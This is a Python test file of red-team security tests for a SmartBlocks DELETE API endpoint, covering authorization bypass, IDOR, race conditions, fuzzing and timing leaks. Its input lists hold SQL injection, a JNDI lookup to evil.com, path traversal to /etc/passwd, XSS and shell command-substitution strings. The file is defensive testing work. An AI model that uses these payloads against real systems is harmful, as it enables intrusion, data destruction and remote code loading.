"""Red Team security tests for SmartBlocks DELETE endpoint (T237).

Tests focus on:
- API1:2023 BOLA (deleting other users' blocks)
- IDOR via path parameter manipulation
- Race conditions in concurrent deletes
- Cascade delete abuse
- HTTP attacks
"""

import concurrent.futures
import json

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import (
    SmartBlock,
    SmartBlockContent,
    SmartBlockCriteria,
)
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestSmartBlockDeleteRedTeam:
    """Red Team tests for DELETE /api/v2/smart-blocks/{id}."""

    def setup_method(self):
        """Clean up before each test."""
        SmartBlockCriteria.objects.all().delete()
        SmartBlockContent.objects.all().delete()
        SmartBlock.objects.all().delete()
        File.objects.all().delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API1:2023 - BOLA (Broken Object Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(reason="T444: BOLA - can DELETE other user's block")
    def test_bola_delete_other_users_block(self, api_client):
        """BOLA: Attacker should NOT be able to DELETE victim's block."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        victim_block = baker.make(
            SmartBlock,
            name="Victim Block",
            kind=SmartBlock.Kind.STATIC,
            owner=victim,
        )

        # Attacker tries to delete victim's block
        response = api_client.delete(f"/api/v2/smart-blocks/{victim_block.id}")

        assert (
            response.status_code == 403
        ), f"BOLA: Attacker can DELETE victim's block (got {response.status_code})"

        # Verify block still exists
        assert SmartBlock.objects.filter(
            id=victim_block.id,
        ).exists(), "BOLA: Victim's block was deleted by attacker"

    @pytest.mark.xfail(
        reason="T445: BOLA - cascade delete affects other user's content",
    )
    def test_bola_cascade_delete_other_user_content(self, api_client):
        """BOLA: Deleting block should NOT delete other users' shared content."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        # Create victim's file
        victim_file = baker.make(
            File,
            name="victim_song.mp3",
            mime="audio/mp3",
            owner=victim,
        )

        # Victim's block with victim's file
        victim_block = baker.make(
            SmartBlock,
            name="Victim Block",
            kind=SmartBlock.Kind.STATIC,
            owner=victim,
        )
        victim_content = baker.make(
            SmartBlockContent,
            block=victim_block,
            file=victim_file,
            position=1,
        )

        # Attacker tries to delete victim's block (and cascade content)
        response = api_client.delete(f"/api/v2/smart-blocks/{victim_block.id}")

        # Should be rejected
        assert (
            response.status_code == 403
        ), f"BOLA: Attacker can trigger cascade delete (got {response.status_code})"

    @pytest.mark.xfail(
        reason="T446: Information disclosure - 404 vs 403 leaks existence",
    )
    def test_bola_delete_leaks_block_existence(self, api_client):
        """BOLA: 404 vs 403 may leak whether block exists."""
        victim = baker.make(User, username="testred_victim")

        # Create a block that attacker shouldn't know about
        secret_block = baker.make(
            SmartBlock,
            name="Secret Block",
            kind=SmartBlock.Kind.STATIC,
            owner=victim,
        )

        # Try to delete it
        response_real = api_client.delete(
            f"/api/v2/smart-blocks/{secret_block.id}",
        )

        # Try to delete non-existent block
        response_fake = api_client.delete("/api/v2/smart-blocks/999999")

        # Both should return same status (403 preferred) to not leak existence
        assert (
            response_real.status_code == response_fake.status_code
        ), f"Information leak: real={response_real.status_code}, fake={response_fake.status_code}"

    # ========================================================================
    # IDOR - ID Manipulation
    # ========================================================================

    def test_idor_sql_injection_in_delete_path(self, api_client):
        """IDOR: SQL injection in DELETE path parameter."""
        sqli_ids = [
            "1' OR '1'='1",
            "1; DROP TABLE cc_block;--",
            "1 UNION SELECT * FROM cc_user",
            "${jndi:ldap://evil.com}",
        ]

        for bad_id in sqli_ids:
            response = api_client.delete(f"/api/v2/smart-blocks/{bad_id}")
            # Should not crash with 500
            assert response.status_code in [
                404,
                400,
            ], f"SQLi in path '{bad_id}' caused {response.status_code}"

    def test_idor_path_traversal_delete(self, api_client):
        """IDOR: Path traversal in DELETE."""
        traversal_paths = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//etc/passwd",
        ]

        for path in traversal_paths:
            response = api_client.delete(f"/api/v2/smart-blocks/{path}")
            assert response.status_code in [
                404,
                400,
            ], f"Path traversal caused {response.status_code}"

    def test_idor_unicode_id_delete(self, api_client):
        """IDOR: Unicode in ID parameter."""
        unicode_ids = [
            "日本語",
            "🎵🎶",
            "<script>alert(1)</script>",
            "null",
            "undefined",
        ]

        for uid in unicode_ids:
            response = api_client.delete(f"/api/v2/smart-blocks/{uid}")
            assert response.status_code in [
                404,
                400,
            ], f"Unicode ID '{uid}' caused {response.status_code}"

    def test_idor_float_id_delete(self, api_client):
        """IDOR: Float ID in DELETE."""
        response = api_client.delete("/api/v2/smart-blocks/1.5")
        assert response.status_code in [
            404,
            400,
        ], f"Float ID accepted: {response.status_code}"

    def test_idor_scientific_notation_id(self, api_client):
        """IDOR: Scientific notation in ID."""
        response = api_client.delete("/api/v2/smart-blocks/1e5")
        assert response.status_code in [
            404,
            400,
        ], f"Scientific notation accepted: {response.status_code}"

    # ========================================================================
    # Race Conditions
    # ========================================================================

    def test_race_double_delete_concurrent(self, api_client):
        """Race: Concurrent DELETE of same block."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        results = []

        def delete_block():
            response = api_client.delete(f"/api/v2/smart-blocks/{block.id}")
            return response.status_code

        # Fire two concurrent deletes
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            futures = [executor.submit(delete_block) for _ in range(2)]
            results = [
                f.result() for f in concurrent.futures.as_completed(futures)
            ]

        # Both should succeed (idempotent) or one should fail
        # But no 500 error
        assert all(
            r in [204, 404] for r in results
        ), f"Race condition caused unexpected status: {results}"

    def test_race_delete_and_update_concurrent(self, api_client):
        """Race: DELETE while PATCHing same block."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        def delete_block():
            return api_client.delete(f"/api/v2/smart-blocks/{block.id}")

        def update_block():
            return api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": "Updated"}),
                content_type="application/json",
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            future_delete = executor.submit(delete_block)
            future_update = executor.submit(update_block)
            delete_response = future_delete.result()
            update_response = future_update.result()

        # Should not crash with 500
        assert delete_response.status_code in [
            204,
            404,
        ], f"Delete during race caused {delete_response.status_code}"
        assert update_response.status_code in [
            200,
            404,
        ], f"Update during race caused {update_response.status_code}"

    # ========================================================================
    # HTTP Attacks
    # ========================================================================

    @pytest.mark.xfail(
        reason="T447: HTTP Method Override causes unintended DELETE",
    )
    def test_http_method_override_on_delete(self, api_client):
        """HTTP: Method override header on DELETE - BUG T447.

        X-HTTP-Method-Override should NOT cause deletion when actual method is DELETE.
        """
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.delete(
            f"/api/v2/smart-blocks/{block.id}",
            HTTP_X_HTTP_METHOD_OVERRIDE="GET",
        )
        # BUG: Block is deleted despite override suggesting GET
        # Expected: Block should still exist
        assert SmartBlock.objects.filter(
            id=block.id,
        ).exists(), "BUG T447: Method override caused unintended deletion"

    def test_http_delete_with_body(self, api_client):
        """HTTP: DELETE with request body (unusual)."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Some servers may behave strangely with body in DELETE
        response = api_client.delete(
            f"/api/v2/smart-blocks/{block.id}",
            data=json.dumps({"force": True, "cascade": True}),
            content_type="application/json",
        )

        # Should handle gracefully (204 or 400)
        assert response.status_code in [
            204,
            400,
        ], f"DELETE with body caused {response.status_code}"

    # ========================================================================
    # Cascade Delete Abuse
    # ========================================================================

    def test_cascade_delete_mass_content(self, api_client):
        """Cascade: DELETE block with 1000+ contents."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block with Many Contents",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Create many contents
        for i in range(100):
            file_obj = baker.make(
                File,
                name=f"song{i}.mp3",
                mime="audio/mp3",
                owner=user,
            )
            baker.make(
                SmartBlockContent,
                block=block,
                file=file_obj,
                position=i,
            )

        response = api_client.delete(f"/api/v2/smart-blocks/{block.id}")
        assert (
            response.status_code == 204
        ), f"Mass cascade delete failed: {response.status_code}"

        # Verify all contents deleted
        assert (
            SmartBlockContent.objects.filter(block=block).count() == 0
        ), "Cascade delete left orphaned content"

    def test_cascade_delete_many_criteria(self, api_client):
        """Cascade: DELETE block with many criteria."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block with Many Criteria",
            kind=SmartBlock.Kind.DYNAMIC,
            owner=user,
        )

        # Create many criteria
        for i in range(50):
            baker.make(
                SmartBlockCriteria,
                block=block,
                criteria=f"field{i}",
                condition="contains",
                value=f"value{i}",
            )

        response = api_client.delete(f"/api/v2/smart-blocks/{block.id}")
        assert (
            response.status_code == 204
        ), f"Mass criteria cascade failed: {response.status_code}"

    # ========================================================================
    # Fuzzing
    # ========================================================================

    def test_fuzzing_naughty_strings_in_delete_url(self, api_client):
        """Fuzzing: Naughty strings in DELETE URL."""
        naughty_strings = [
            "undefined",
            "null",
            "None",
            "true",
            "false",
            "[]",
            "{}",
            "NaN",
            "Infinity",
            "$(whoami)",
            "`id`",
        ]

        for string in naughty_strings:
            response = api_client.delete(f"/api/v2/smart-blocks/{string}")
            assert response.status_code in [
                404,
                400,
            ], f"Naughty string '{string}' caused {response.status_code}"

    def test_fuzzing_large_id_delete(self, api_client):
        """Fuzzing: Very large ID in DELETE."""
        large_ids = [
            2**31 - 1,  # Max int32
            2**63 - 1,  # Max int64
            999999999999999999,
        ]

        for lid in large_ids:
            response = api_client.delete(f"/api/v2/smart-blocks/{lid}")
            assert (
                response.status_code == 404
            ), f"Large ID {lid} caused {response.status_code}"

    # ========================================================================
    # Side Channel / Timing
    # ========================================================================

    def test_timing_delete_existing_vs_nonexisting(self, api_client):
        """Timing: DELETE existing vs non-existing block timing."""
        import time

        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Time delete of existing block
        start = time.time()
        api_client.delete(f"/api/v2/smart-blocks/{block.id}")
        time_existing = time.time() - start

        # Time delete of non-existing block
        start = time.time()
        api_client.delete("/api/v2/smart-blocks/999999")
        time_nonexisting = time.time() - start

        # Timing difference should not be significant (less than 3x)
        ratio = time_existing / time_nonexisting if time_nonexisting > 0 else 0
        assert (
            0.3 < ratio < 3.0
        ), f"Timing leak: existing={time_existing:.4f}s, non-existing={time_nonexisting:.4f}s"
